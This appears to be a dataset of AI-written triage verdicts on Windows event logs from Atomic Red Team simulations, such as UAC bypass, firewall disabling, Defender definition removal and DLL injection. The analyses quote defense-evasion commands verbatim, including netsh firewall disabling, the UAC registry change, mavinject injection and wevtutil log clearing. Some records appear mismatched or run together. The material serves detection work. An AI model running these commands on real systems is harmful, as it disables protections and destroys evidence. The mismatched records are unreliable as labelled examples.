  1. **Immediate Containment:** Isolate ""Server002"" from the network to prevent further compromise.
  2. **Forensic Investigation:** Collect forensic artifacts, especially memory and disk images, for deeper analysis of any persistence mechanisms or further malicious payloads.
  3. **Log Recovery:** Attempt to recover any cleared logs using backup mechanisms or shadow copy.
  4. **Mitigation:** Review and strengthen access controls and monitoring to prevent similar privilige abuse and evasive actions in the future.
  5. **Security Audit:** Perform a comprehensive audit of user activities and validate all administrative actions across critical systems."
UACME Bypass Method 33,"In analyzing the provided logs, several suspicious activities can be noted:

### Log Entry Analysis:

1. **System Log: Event ID 104 and 1102**:
   - The clearing of log files (Event ID 104 for System and PowerShell, and Event ID 1102 for Security) by the user `admin_test` is suspicious. This action is often performed by attackers to cover their tracks after unauthorized activities.

2. **Sysmon Log Entries**:
   - `Akagi64.exe` references appear in Command-Line execution. This is associated with the UACME project, which is known for bypassing User Account Control (UAC) on Windows, a behavior typically linked to malicious activity or penetration testing tools.
   - Frequent use of `cmd.exe` with likely crafted payloads. The presence of command line operations related to `Akagi64.exe` is a strong indicator of UAC bypass attempts.
   - Repeated execution of `wevtutil.exe` to clear event logs is consistent with attempts to obscure actions taken by a user or process. This aligns with the clearing of logs observed in Event ID 104 and 1102.
   - Execution of various system utilities like `whoami.exe`, and `hostname.exe` without clear legitimate context, often executed during post-exploitation reconnaissance.

3. **Security Log: Event ID 4672**:
   - This indicates special privileges were assigned, including significant privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, etc., possibly elevated from SYSTEM context. This is concerning as attackers may use such privileges for privilege escalation.

4. **Multiple Edge Update Executions**:
   - Multiple instances of `MicrosoftEdgeUpdate.exe` and related processes under SYSTEM context could be part of scheduled updates but should be correlated with known update schedules and activities to rule out misuse or exploitation.

### Conclusion:

Given the evidence collected:

- **Log Cleansing**: Intentional log cleansing suggests covert action and an attempt to erase traces.
- **Akagi64.exe Execution**: Indicates a potential security bypass attempt.
- **Privilege Escalation**: Use of higher privileges flags potential unauthorized access.

### Resolution: **MALICIOUS**

There are strong indicators of malicious activity in these logs. Actions such as log clearing, suspicious command execution related to `Akagi64.exe`, and processes associated with privilege escalation are classic indicators of a security breach or intrusion attempt.

### Recommended Actions:

1. **Immediate Containment**: Isolate the affected host from the network to prevent further potential malicious activity.
2. **Incident Response**: Initiate a formal incident response plan, including memory and disk imaging for further forensic analysis.

5. **System Patching**: Verify that the system is up-to-date with security patches to prevent exploitation via known vulnerabilities.

Further investigation and correlation with any other logs or threat intelligence sources are advised to ascertain the full scope and exact nature of the compromise."
Disable Windows Security Center Notifications,"Upon analyzing the provided log entries, the following observations and assessments can be made:

1. **Usage of `wevtutil.exe`:**
   - The `wevtutil.exe` utility has been used multiple times in a short period of time to clear event logs (`cl` command) for the following channels: Microsoft-Windows-Sysmon/Operational, Application, System, Security, and Windows PowerShell. This behavior is generally regarded as suspicious, particularly when executed by a non-system account.

2. **Execution of Command Prompt (`cmd.exe`) with Registry Modifications:**
   - The execution of `cmd.exe` with the command-line arguments to modify the registry using `reg.exe` is particularly suspicious. The command modifies the registry key to potentially alter the behavior of the Windows shell, which could hint at a configuration change to disable or modify specific user interfaces or features.

3. **Event Log Clearing:**
   - The logs indicate that event logs including ""Security"" and ""System"" have been cleared. Event log clearing is often used by malicious actors to cover tracks following potentially malicious activities.

4. **Security Privileges:**
   - The `4672` event indicates that the user `admin_test` has been granted a series of powerful privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, etc., which are typically not required for regular administrative tasks unless specific maintenance tasks are being performed. 

5. **Identified Security Audit Event (`EventID: 1102`):**
   - This event indicates that the security log was cleared. It is a high indicator of suspicious activity as it signifies an attempt to remove traces of actions conducted on the system.

**Assessment:**

- The logs certainly contain signs of suspicious activities that merit further investigation. Key indicators such as the use of `wevtutil.exe` to clear logs, the modification of the Windows registry through a command execution, and the clearing of security and system logs collectively suggest a potentially malicious behavior pattern.
- These behaviors could point towards an attempt at privilege escalation and/or persistence mechanisms while obscuring evidence of activities.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**

- Initiate a deeper investigation into the context around these actions. Identify whether these actions were authorized and part of a legitimate administrative task.
- Review configurations and recent changes to group policies or active directory settings to understand the intent behind the registry modifications.
- Conduct a thorough endpoint security assessment on `Server002`, considering forensic analysis to capture volatile data and ensure no backdoors or malicious persistence mechanisms are in place.
- Consider enabling additional security monitoring and logging to prevent future incidents and detect any further anomalous behavior."
Remove Windows Defender Definition Files,"Upon reviewing the provided Windows event logs, several points of interest and potential indicators of malicious activity have been identified:

1. **Repeated Use of `wevtutil.exe`**:
   - The logs indicate multiple executions of `wevtutil.exe`, a legitimate Windows command-line utility that is typically used for managing event logs. It is being executed with different command-line parameters to clear multiple logs: Application, System, Security, Windows PowerShell.
   - Frequent clearing of logs, especially these particular ones, can be an indicator of an attempt to obfuscate malicious activity or hide actions on the system.

2. **Logs Clearing Events**:
   - Corresponding to the use of `wevtutil.exe`, there are clear indications of logs being cleared (`EventID 104` for System, `1102` for Security), corroborating the use of `wevtutil.exe`.

3. **Suspicious Command Execution**:
   - The process `cmd.exe` is executing `MpCmdRun.exe` with the argument to `-RemoveDefinitions -All`. This removes all definitions for Windows Defender, potentially disabling it or hampering its ability to detect malware.

4. **User Context and High Integrity Level**:
   - All actions appear to be conducted under the user account `admin_test` with high integrity level. This raises concerns about privilege use, especially if this is an unusual account or context for these actions.

5. **Presence of `whoami.exe` and `hostname.exe`**:
   - These utilities are often used to gather information about the system and current user context, possibly indicating reconnaissance activity as part of a larger attack strategy.

Based on these observations, the logs suggest activities that are suspicious and warrant further investigation. Specifically, the repeated clearing of logs, the disabling of security tools, and the use of information-gathering commands collectively point towards potential malicious activity.

**Assessment**: SUSPICIOUS - The activities outlined in the logs, especially the clearing of logs and disabling Windows Defender definitions, are not typical system operations and suggest attempts to conceal actions. Immediate steps should include:
- Verifying the legitimacy of the `admin_test` account and reviewing its history of actions.
- Checking for any unauthorized access or anomalies around the time of these events.
- Restoring and reviewing historical logs from backups if possible to identify what actions were taken before the logs were cleared.
- Monitoring the system for any further suspicious activities and ensuring that Windows Defender is fully operational with up-to-date definitions."
Install root CA on Windows with certutil,"Upon reviewing the provided Windows event logs, a series of observations indicate potentially suspicious activities. Here's a detailed analysis:

### Suspicious or Anomalous Behavior

1. **Log File Clearance Events**:
   - The System, Windows PowerShell, and Security logs were cleared (Event ID 104 and 1102). Such actions, especially without authorized or scheduled maintenance, are significant red flags suggestive of attempts to cover up activity or remove traces.

2. **Use of `wevtutil.exe`**:
   - Several instances of the `wevtutil.exe` used with the `cl` (clear) argument, indicating the clearing of logs manually and programmatically (Event ID 1 in multiple logs), involve the same user (`SERVER002\\admin_test`). This action aligns with efforts to hide potentially malicious activities.

3. **PowerShell Execution and `certutil.exe` Usage**:
   - Creation and execution of a PowerShell script using `certutil` to manipulate certificate stores are logged (Event: launching PowerShell with `certutil -addstore`). `certutil` is often used by attackers for downloading files or adding rogue certificates, indicating potential certificate manipulation or persistence techniques.

4. **Process Anomalies**:
   - The `whoami.exe`, `hostname.exe`, and `conhost.exe` usage patterns do not immediately indicate malicious behavior alone, but in the context of log clearance and manipulated scripts, it points to likely suspicious activity.

### Indicators of Malicious Activity

- **Intentional Log Tampering**: The clearing of logs combined with carefully scripted executions of legitimate tools (`wevtutil`, `certutil`) strongly suggests malicious intent, particularly considering the administrator user involvement.
  
- **High-Integrity Level Operations**: Many of these actions are performed with 'High' integrity levels, suggesting potential privilege misuse or escalation.

- **Execution of Potentially Malicious Commands**: Executing commands for certificate manipulation and using PowerShell at an admin level reflect a misuse of legitimate scripting and management tools typically utilized in attacks that involve lateral movement, privilege escalation, or deployment of persistent mechanisms.

### Assessment

Based on the analysis and context derived from the logs, the evidence suggests that the logs contain actions consistent with malicious activity. The use of log-clearing utilities, suspicious command-line arguments with PowerShell, and the administrative context are indicative of an attempt to compromise or exploit the host.

### Resolution

**Resolution: MALICIOUS**

### Guidance to Proceed

1. **Immediate Containment**: Isolate the host (Server002) from the network to prevent further potential spread or leakage of any compromised data.
   
2. **In-depth Forensic Analysis**: Conduct a comprehensive forensic examination of the host to identify any additional malicious files, scripts, or other persistence mechanisms not immediately visible in the logs.
   
3. **User Account Audit**: Review actions and credentials around the user account `admin_test` to determine if they were compromised or misused.
   
4. **Log Retention and Monitoring**: Implement robust log retention policies and continuous monitoring to prevent such unauthorized clearances in the future.
   
5. **Patch and Update Systems**: Ensure all systems are up to date with the latest security patches to reduce the likelihood of exploitation via known vulnerabilities.

This assessment underscores a significant security incident requiring immediate response to confirm the extent of the compromise and to remediate effectively."
Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key,"Based on the analysis of the provided logs, there are several events that raise concerns indicating potentially malicious activity on the host:

1. **Log Clearing Events**:
   - There are entries in the System and Security logs (EventID 104 and 1102) where logs have been cleared by the user ""admin_test"". This is highly suspicious as clearing logs is a tactic often used by attackers to cover their tracks.

2. **Suspicious PowerShell Activity**:
   - The PowerShell logs indicate changes to the system registry without a clear, benign purpose. Specifically, the command modifies the ""ConsentPromptBehaviorAdmin"" registry setting to ""0"", which disables User Account Control (UAC) prompts for admin approvals, potentially allowing elevated privileges without alerts. This behavior is consistent with attempts to escalate privileges.

3. **Use of 'wevtutil' Tool**:
   - There are multiple Sysmon events indicating the use of ""wevtutil.exe"" to clear logs ('cl' command). This supports the behavior seen in the System and Security logs where logs were cleared.

4. **Command Line Utility Executions**:
   - The commands run via utilities like 'whoami.exe', 'hostname.exe', and others suggest either routine diagnostic or reconnaissance activities, usually associated with attackers gaining a foothold in a system and understanding the environment.

5. **Process Executions**:
   - Frequent and automated script executions, particularly involving PowerShell, and adjustment of key system configurations without documented reason points towards potentially automated scripts or attacker-driven activities.

Overall, several logs have been cleared, and critical system settings have been altered, indicating intent to obscure activities and potentially escalate privileges—hallmarks of malicious behavior.

**Final Assessment: MALICIOUS**
- The activities identified strongly suggest malicious intent, particularly with the log clearing and undocumented changes to security-related configurations.

**Guidance:**
- Immediate incident response actions should be undertaken:
  - Isolate the affected host to prevent further potential compromise.
  - Conduct full forensic analysis to understand the scope and origin of the compromise.
  - Assess and restore configurations to a secure baseline.
  - Check for any additional hosts showing similar indicators.
  - Review and enhance monitoring and logging configurations to detect future similar behaviors."
Modify Registry of Current User Profile - cmd,"Upon reviewing the provided event logs, several points stand out, indicating potential malicious activity:

1. **Log Clearing Activity:**
   - The Security and System logs show that logs were cleared at specific times by the user `admin_test`. This is evident from Event ID `1102` in the Security log and Event ID `104` in the System log. Log clearance can be an indication of a cover-up attempt as attackers often clear logs to obfuscate their tracks.

2. **Command Line Utility - `wevtutil` Use:**
   - Multiple entries in the Sysmon logs indicate the execution of `wevtutil.exe` (Windows Event Utility) with the command line `cl` for clearing logs. This is suspicious when combined with the log clearing entries, pointing to potential malicious intent.

3. **Registry Modification:**
   - The Sysmon logs show command-line activity from `cmd.exe` and `reg.exe`, which attempted to change Windows Explorer settings (specifically hiding file extensions). This could be used to confuse users about the true nature of files, a technique often used in malware delivery.

4. **Additional Suspicious Commands and Use of `whoami`:**
   - Execution of commands like `whoami` indicates a check of the current logged-in user, which could be an attacker confirming they have the expected access.
   - The use of `HOSTNAME.EXE` following log manipulation could be part of an attacker's reconnaissance or system enumeration processes.

5. **Consistency Across Logs:**
   - The series of events—log manipulations, execution of system utilities (`svchost.exe`, `whoami.exe`, `hostname.exe`), and registry edits—create a pattern consistent with a host compromise.

**Assessment:**
Based on the activities observed, particularly the clearing of logs, execution of `wevtutil` for clearing logs, and registry modification to hide file extensions, there is reasonable confidence to categorize this behavior as MALICIOUS. The user `admin_test` appears to be involved in these potentially malicious activities, indicating compromised credentials or malicious intent. Caution should also be taken as similar behavior can be expected across other systems.

**Guidance:**
1. **Immediate Response:**
   - Isolate the affected system (Server002) to prevent further unauthorized access or data exfiltration.
   - Conduct a full forensic investigation to ascertain the extent of the compromise and identify potential backdoors or other systems affected.
   - Reset credentials for the involved user accounts, especially `admin_test`, and review all privileged account activities.

2. **Audit and Monitoring:**
   - Enhance logging and monitoring for better visibility into similar suspicious behaviors.
   - Conduct a comprehensive assessment of security controls, especially related to accounts with elevated privileges.

3. **Prevention Measures:**
   - Implement stricter access controls and ensure least privilege is applied for administrative activities.
   - Educate users on cybersecurity hygiene, particularly regarding the significance of log file integrity and protection against social engineering tactics."
Renamed Microsoft.Workflow.Compiler.exe Payload Executions,"Based on the analysis of the provided event logs, the following points summarize my findings:

1. **Security Log and Log Clearing:**
   - The logs indicate that the security, system, and Windows PowerShell event logs were cleared (EventIDs 1102 and 104). This action was performed by the user `admin_test`. Clearing event logs is a common technique used by attackers to cover their tracks. This is highly suspicious if not expected as part of regular maintenance activities.

2. **Unauthorized Process Execution:**
   - There are multiple instances of PowerShell being used to execute commands, particularly involving a file named `svchost.exe` located in an unusual directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\ExternalPayloads`). Legitimate `svchost.exe` processes should run from the `C:\\Windows\\System32\\` directory. This behavior is suspicious and potentially malicious, especially given the context of the Atomic Red Team simulation, which mimics adversarial tactics.

3. **Sysmon Logs Indicating Command Execution and Process Creation:**
   - The Sysmon logs show several instances of the use of `wevtutil.exe` by the user `admin_test` to clear logs with the command `wevtutil.exe cl <LogName>`. This reinforces the suspicion of an attempt to hide activity.
   - There is also the creation and execution of the suspicious `svchost.exe` which matches the suspicious PowerShell activity.

4. **Application Log Errors:**
   - There is an application error related to `svchost.exe`, which terminated due to an unhandled exception. While application crashes can occur, the context of `svchost.exe` running from a non-standard path further supports the potential compromise.

5. **Elevated Privileges:**
   - There was a privilege escalation logged (EventID 4672), giving the SYSTEM user a wide range of privileges. Although this may be standard for legitimate system operations, when paired with the other suspicious activities, this could indicate an attempt to gain greater control over the system.

Given these findings, the activity observed in the logs is highly suspect, characterized by:
- Unauthorized and suspicious clearing of logs.
- Execution of a masqueraded process (`svchost.exe`) from a non-standard directory.
- Usage of PowerShell in a manner consistent with known attacker techniques.
- Elevated privilege operations.

**Resolution: MALICIOUS**

**Recommendation:**
1. **Immediate Action:**
   - Conduct a full investigation of the host `Server002` for signs of compromise.
   - Isolate the system to prevent further unauthorized access and potential lateral movement within the network.

Masquerading - non-windows exe running as windows exe,"Upon reviewing the provided event logs, several suspicious activities can be noted that might be indicative of potential malicious behavior. Here's a detailed breakdown of the findings:

### Detailed Analysis

#### 1. Windows PowerShell Logs
- There is evidence of potentially malicious PowerShell commands. Specifically, a script is seen executing with a command that copies a file (`T1036.003.exe`) to `svchost.exe` in the temporary directory and attempts to execute it. The use of `svchost.exe` is particularly suspicious as it is often targeted by attackers for masquerading to evade detection.
- The command tries to start the process, handle exceptions, and then stop the process, indicating an attempt to run and potentially test malicious execution.

#### 2. Security Logs
- Event ID 1102 logs indicate that the security log was cleared by the user `admin_test`. This action is often performed by attackers to cover their tracks after engaging in suspicious or malicious activity.
- Numerous Event ID 5379 logs indicate a sequence of failed attempts to interact with credentials related to a Microsoft account, pointing to possible attempts at unauthorized access or enumeration of credentials.

#### 3. Sysmon Logs
- Multiple Sysmon logs (Event ID 1 and 5) show process creation related to suspicious PowerShell activity involving the `T1036.003.exe` masquerade.
- Execution of `wevtutil.exe` to clear logs for channels such as Sysmon/Operational, System, Application, and several others, aligns with attempts to hide evidence of activities.
- Execution of `whoami.exe` and `hostname.exe` also suggests possible reconnaissance or automation scripts that are being run.

### Assessment

Upon cross-referencing all these logs, the activities collectively indicate suspicious and potentially malicious actions. The combination of:
- Executable masquerading attempts via PowerShell
- Clearing of logs to potentially hide activities
- Failed credential access attempts

These behaviors are aligned with typical tactics used in the initial stages of a cyber attack, such as lateral movement or establishing persistence.

#### Anomalous and Suspicious Behavior Observed:

1. **Event Log Clearing:**
   - Multiple events indicate the clearing of event logs (`EventID 104` in System and Windows PowerShell, `EventID 1102` in Security) by the user `admin_test` on `SERVER002`. These events were executed via the `wevtutil.exe` utility.
   - Clearing event logs is not a routine activity and often indicates an attempt to cover tracks following potentially malicious actions.

2. **Unusual Command Execution:**
   - The execution of `cmd.exe` with a command-line argument to modify Windows Registry settings (`reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPM /t REG_DWORD /d 2 /f`) suggests a potential configuration change that could affect system security or functionality.

3. **High-Integrity Level Processes by admin_test:**
   - Processes like `whoami.exe` and the command-line operations are executed under a high integrity level (`IntegrityLevel: High`) by `admin_test`. This could be indicative of actions requiring elevated privileges, which are suspicious in the context of log clearing.
   - `wevtutil.exe` operations are also executed with high integrity, aligning with the log-clearing actions performed.

4. **Multiple Edge Updates:**
   - Several processes related to Microsoft Edge Update were logged, appearing consistent with legitimate operations of Edge updates. However, given the simultaneous log-clearing events, this raises a red flag about their legitimacy or whether they are potentially tampered with to invoke unexpected behavior.

#### Potential Indicators of Compromise:

- **Log Clearing Attempts:** 
  - Attempt to hide actions by clearing logs immediately suggests attempts to remove evidence of potentially malicious activities.

- **Registry Modification:**
  - Modifications to the Windows registry without clear administrative approval or documentation might suggest an attempt to weaken security settings or configure the system for subsequent exploitation.

#### Assessment of the Situation:

Based on the events observed, particularly the synchrony in log clearing and execution of system utilities like `cmd.exe` and `reg.exe`, there are clear indicators of suspicious activity that align with behavior exhibited in trained compromises. The clearing of event logs by the same user who executed high-privileged commands immediately prior is typically not characteristic of benign operations, and is often used by attackers to obfuscate their activities.

#### Guidance on How to Proceed:

1. **Investigate User Activities:**
   - Investigate the actions of `admin_test` thoroughly. Verify if this user account activity aligns with known and approved administrative tasks.

2. **Analyze Registry Changes:**
   - Evaluate the implications of the registry change on system security and review whether similar changes have occurred historically.

3. **Monitor for Persistence Mechanisms:**
   - Given the presence of Edge Update activities, ensure that this is indeed legitimate and hasn't been used to implant persistence mechanisms.

4. **Conduct a Comprehensive Security Review:**
   - Audit the security settings of `SERVER002` and ensure no other unauthorized changes have been made.

#### Resolution:

**SUSPICIOUS** - The logs contain activities, particularly the log-clearing actions and system registry modifications, that warrant a thorough investigation due to their alignment with common malicious techniques used to conceal unauthorized operations. Further analysis and monitoring are recommended to determine if these actions are associated with legitimate administrative activity or constitute part of a compromise."
Disable UAC - Switch to the secure desktop when prompting for elevation via registry key,"Upon detailed analysis of the available logs, here are the findings:

### Windows PowerShell Log Analysis

1. **Command Execution**: All PowerShell events seem to run the following command: 
   ```
   Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force
   ```
   - This command modifies the Windows registry to change the behavior of the secure desktop prompt. Altering `PromptOnSecureDesktop` can affect UAC prompts' security by preventing certain elevation prompts from requiring the secure desktop, which can be considered suspicious.

### Sysmon Log Analysis

1. **Event ID 1 (Process Creation)**: Execution of `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `powershell.exe`, along with Microsoft Edge Update related executables is observed.
   - **wevtutil.exe** and **whoami.exe** usage, along with the `Set-ItemProperty` command in PowerShell, indicates a possible attempt at information gathering or environment modification.
   - Microsoft Edge Update events are legitimate as they correspond to a system update process.

2. **Event ID 5 (Process Termination)**: These events are consistent with processes seen in normal Windows operations. However, the presence of **wevtutil.exe** in querying system logs multiple times shortly before logs are cleared is suspicious.

### Security Log Analysis

1. **Event ID 1102 (Log Cleared)**: The security log was cleared by `admin_test`, which is highly anomalous and often associated with malicious actor activities trying to cover their tracks.

### System Log Analysis

1. **Event ID 104 (Log Cleared)**: System and Windows PowerShell logs were also cleared by `admin_test`, further reinforcing the suspicion of covering tracks after potentially malicious activity.

### Application Log Analysis

1. The application log contains typical services like Edge Update and Software Protection Platform Service activities.

### Assessment

Based on the logs:

- The combination of PowerShell alteration of security settings, multiple uses of `wevtutil.exe`, powershell.exe execution with modification to secure desktop settings, and the manual clearance of logs are all indicative of potentially malicious activity aiming to alter system policies and hide tracks.

### Resolution

- **MALICIOUS**: The activities of altering security settings in the registry and clearing logs point towards attempts of a potential compromise or event tampering.

### Recommended Next Steps

1. **Immediate Isolation**: Isolate the host `Server002` from the network to prevent further potential exploitation.
2. **User Account Review**: Investigate the activities and access privileges of the `admin_test` user to understand how this user was able to perform these actions and if any credentials are compromised.
3. **In-depth System Forensics**: Conduct a full forensic investigation on the system to uncover potential malware, unauthorized changes, or further indicators of compromise.
4. **Review Security Settings**: Ensure security settings, especially related to UAC and secure desktop prompts, are returned to their secure defaults.
5. **Audit and Monitor**: Increase monitoring on high-privilege users, log activity, and ensure audit logs are protected against tampering in the future. 

These actions should provide a comprehensive approach to addressing and mitigating the identified threat."
mavinject - Inject DLL into running process,"Upon reviewing the provided Windows event logs, several key observations point towards suspicious and potentially malicious activity:

1. **Event Log Clearing:**
   - Security log Event ID 1102, System log Event ID 104: Both logs show that the event logs were cleared by the user ""SERVER002\\admin_test"". This action is often considered suspicious as it may indicate an attempt to cover up other activities performed on the system.

2. **Use of Command Line:**
   - Sysmon EventID 1, shows `cmd.exe` with command line arguments used to execute `mavinject.exe` with `/INJECTRUNNING` and a reference to a `T1218.dll`, which is strongly indicative of process injection. This is a well-known technique used by attackers to execute code in the address space of another process, and T1218 is an Atomic Red Team technique identifier which further suggests this could be part of a penetration testing or exploit framework execution rather than routine behavior.

3. **Process Executions Related to Scripting and System Utilities:**
   - The frequent execution of system utilities and scripts (`wevtutil.exe`, `hostname.exe`, `whoami.exe`, `WindowsPowerShell`), especially relating to the clearing of event logs, suggests misuse of administrative tools. This pattern is commonly associated with malicious actors attempting to enumerate and navigate a system stealthily.

4. **Unusual Edge Update Behavior:**
   - Numerous entries for Microsoft Edge Update processes opening and closing rapidly (`MicrosoftEdgeUpdate.exe`). While not inherently malicious, if unexpected or unscheduled by IT policy, such rapid actions might deserve further scrutiny, especially if used for persistence or unauthorized data downloading.

Based on the above observations, particularly the clearing of logs, usage of `cmd.exe` for potential DLL injection, and suspicious administrative tool utilization, these logs collectively show behavior that extends beyond benign activity.

**Conclusion: SUSPICIOUS**

There is a significant indication of suspicious activity that warrants further investigation. A comprehensive review of the security posture on `Server002` is recommended, including:
- Cross-referencing the logged activities with authorized tasks.
- Reviewing user permissions and behaviors for `admin_test`.
- Conducting an integrity check of system binaries and open sessions.
- Analyzing network traffic around the times of these events for suspicious communication.
  
A deeper forensic analysis may be needed, potentially involving memory dumps, to further understand the scope and intention behind these actions."
Add Network Share,"Upon reviewing the provided Windows event logs, several aspects stand out that may warrant further investigation:

### Anomalies and Suspicious Activities:

1. **Event Log Clearing Events:**
   - Multiple instances of event logs being cleared are highly suspicious, especially when it involves administrative accounts. Specifically:
     - Event ID 104 indicates the clearing of logs for both ""System"" and ""Windows PowerShell"" channels by the user `admin_test`. 
     - Event ID 1102 in the Security log also indicates the clearing of Security logs by `admin_test`.
   - The clearing of logs is often a tactic used by attackers to cover their tracks after performing unauthorized actions.

2. **Abnormal Command Usage:**
   - Sysmon Event ID 1 shows the execution of `wevtutil.exe` with the `cl` (clear) command targeting multiple logging channels. This command is used to clear logs and executed under the `admin_test` account with high integrity level, which is suspicious in context with the log clearance events noted above.
   - The `cmd.exe` uses the `net` command to map and share network directories. The command-line syntax appears as an attempt to manipulate network shares, which could suggest lateral movement or data exfiltration setups:
     - `cmd.exe /c net use c: \\test\share & net share test=\\test\share /REMARK:""test share"" /CACHE:No`

3. **Usage of System Utilities:**
   - Processes like `whoami.exe` and `hostname.exe` are executed. While they can be legitimate, in conjunction with log clearing and the network share commands, they could indicate an attempt to probe or verify user permissions during unauthorized access.

4. **Frequent Execution Contexts:**
   - Many events show actions executed by the `admin_test` user with high integrity levels. This could either be an indication of an administrative task or an elevated privilege being misused for malicious intent.

### Assessment and Guidance:

- **Resolution:** **SUSPICIOUS** 
  - The combination of log clearing activities, unusual usage of system utilities and commands, and the execution context (elevated privileges) strongly suggests that there might be inappropriate or potentially malicious actions being conducted on the system. However, without additional supporting information (such as user intention, authorizations, or corroborating evidence from other security solutions), it is not possible to definitively label it as malicious.

### Recommended Actions:

1. **Immediate Review of Account Activity:**
   - Investigate the `admin_test` account to determine legitimacy and the user's intentions. Ensure that the account has not been compromised.

2. **Incident Response:**
   - Invoke incident response procedures to contain the potential threat. Monitoring should be increased on entities involved, and changes should be tracked.

3. **Analyze Network Activity:**
   - Cross-reference network logs for any anomalous or unauthorized access patterns or data transfers related to `admin_test` activities.

4. **Consider Forensic Analysis:**
   - Conduct detailed forensic analysis on the involved systems, including disk imaging and memory analysis for any signs of malware or backdoor persistence.

5. **Increase Logging and Monitoring:**
   - Ensure that logging configurations are improved to capture detailed activities, and consider using centralized logging solutions to prevent unauthorized log modifications. Extensions like auditing directory service access may also be beneficial.

6. **User Training and Security Measures:**
   - If the activity proves to be non-malicious but misguided, conduct user training on proper use of sensitive commands and tighten roles and responsibilities related to log management."
Create Windows Hidden File with Attrib,"Upon reviewing the provided logs from the System, Sysmon, Application, and Security channels, several activities suggest potential malicious behavior. Here's a breakdown of the findings:

1. **Clearing of Event Logs**: 
    - There are multiple instances of event logs being cleared:
      - System Channel: Cleared by `admin_test` -> ProcessId: 1548
      - Windows PowerShell Channel: Cleared by `admin_test` -> ProcessId: 5460
      - Security Channel: Event ID 1102 indicates the Security log was also cleared by `admin_test`.
    - Clearing logs is a well-known tactic used by attackers to hide their tracks and indicates a potential intrusion.

2. **Execution of Suspicious Commands**:
    - The Sysmon log entries show cmd.exe being executed with certain commands that imply attempts at stealth or covering tracks. For example:
      - `cmd.exe /c echo system_Attrib_T1564.001 >> %temp%\\T1564.001.txt`
      - `attrib.exe +h %temp%\\T1564.001.txt`
    - These activities relate to the MITRE ATT&CK technique ID T1564.001 (Indicator Removal on Host: Hidden Files and Directories), which suggests an effort to evade detection.

3. **Usage of wevtutil.exe**:
    - The logs show the execution of `wevtutil.exe` with the `cl` (clear) command on multiple Windows Event Log channels (e.g., Sysmon and Application). This is consistent with log clearing activity.
    - This behavior is indicative of an attempt to remove traces of activities or obfuscate malicious operations.

4. **Series of Commands by `admin_test`**:
    - The user `admin_test` executed several high-integrity commands that align with suspicious activities, such as `whoami.exe` and other system utilities in quick succession. This rapid execution and use of such utilities are often indicative of an attacker performing reconnaissance or moving laterally within a compromised system.

5. **Network Service Activity**:
    - While Microsoft Edge Update and other services related to system maintenance are running, these appear to be benign system updates executed by `NT AUTHORITY\SYSTEM` and aren't indicative of malicious activity on their own.

**Conclusion and Recommendation**:
- **Suspicious Activity Detected (SUSPICIOUS)**: The logs exhibit several red flags, particularly the clearing of logs, use of utilities for obscuring evidence, and potentially hostile script execution patterns. These actions suggest a compromise that merits further investigation.
- **Next Steps**:
  1. Conduct a thorough forensic analysis on `Server002` to identify any unauthorized changes or installation of backdoors.
  2. Review user `admin_test`'s activities, access logs, and recent changes to assess if credentials have been compromised.
  3. Enhance monitoring to detect similar behaviors in future, including alerting on log clearing and suspicious command executions.
  4. Consider a full incident response, including patching potential vulnerabilities, increasing authentication mechanisms, and educating users on security best practices to prevent future incidents."
Blackbit - Disable Windows Firewall using netsh firewall,"Upon reviewing the provided Windows event logs from the system, application, and security channels, as well as Sysmon logs, I have identified several indicators of potentially suspicious behavior that warrants further investigation. Here's the detailed analysis:

### Anomalies and Suspicious Behaviors:

1. **Log File Clearing**:
   - The system, Windows PowerShell, and security logs have been cleared, as indicated by Event ID 104 in the system logs and Event ID 1102 in the security logs. The user ""admin_test"" was responsible for these actions.
   - Log clearing can be an indication of an attempt to cover tracks after a compromise or unauthorized activities.

2. **Use of `wevtutil`**:
   - Multiple invocations of `wevtutil.exe` to clear logs, including specific channels like Sysmon, Application, System, and Security logs. These actions align with typical log tampering efforts to delete evidence of malicious activities.

3. **Execution of Critical Commands**:
   - A concerning activity includes the execution of the `netsh` command (`netsh firewall set opmode mode=disable`), which disables the firewall. This execution is usually undesired and could indicate an attempt to open up network communication paths externally.

4. **High Integrity Level Operations**:
   - The operations mentioned, such as executing system commands and clearing logs, occurred with a high integrity level. This implies that the user account had elevated privileges, increasing the potential impact of any malicious activities.

5. **Suspicious Process Tree**:
   - The `cmd.exe` process executed network commands and was followed by `netsh.exe` disabling the firewall, which is suspicious. This might indicate scripts or batch files running to alter system configurations unfavorably.
   
6. **Privilege Escalation**:
   - Event ID 4672 shows the SYSTEM account is granted several privileges, including SeDebugPrivilege, which could be used for malicious purposes, although it’s common for SYSTEM accounts to have these by default. However, in light of other suspicious activities, this should be corroborated with account usage patterns.

### Conclusion:

The analysis of these logs reveals a series of activities that are highly suspicious due to the clearing of logs, use of powerful system utilities, and critical command execution such as disabling the firewall. This pattern is consistent with potential post-exploitation or lateral movement maneuvers which could be part of a larger intrusion campaign.

### Resolution:

- **SUSPICIOUS**: The logs contain activities that raise suspicion and appear anomalous. Although these event IDs or command executions might occasionally occur in legitimate administrative contexts, the aggregation of these actions, particularly the clearing of event logs and disabling of the firewall, leans towards a potentially malicious intent that warrants further investigation.

### Next Steps:

- **Immediate Investigation**: Conduct a comprehensive investigation, looking into the origin and context of these activities. Check for unauthorized access, especially focusing on the time correlated with log clearings and firewall changes.
- **Account Review**: Review the activities of the ""admin_test"" account to ascertain if it has been compromised. Additional credentials might be involved.
- **Network Monitoring**: Increase monitoring on network traffic to and from the affected host, given that the firewall was disabled.
- **Forensics**: Preserve disk and memory state if possible, to help trace back any potentially unauthorized sessions or file changes that might not appear in logs due to them being cleared.
- **Audit and Restrict Permissions**: Audit current user permissions and enforce the principle of least privilege.

Through these steps, confirm whether malicious activity did indeed occur and take steps to remediate and secure the environment."
Activate Windows NoFind Group Policy Feature,"Upon examining the provided event logs, I identified several notable activities that indicate potential security concerns:

1. **Clearing of Event Logs:**
   - The security log contains a record indicating that the event log was cleared (Event ID 1102). The action was performed by the user ""admin_test"" on the computer ""Server002"" with the `LogonId` `0x142F98`.
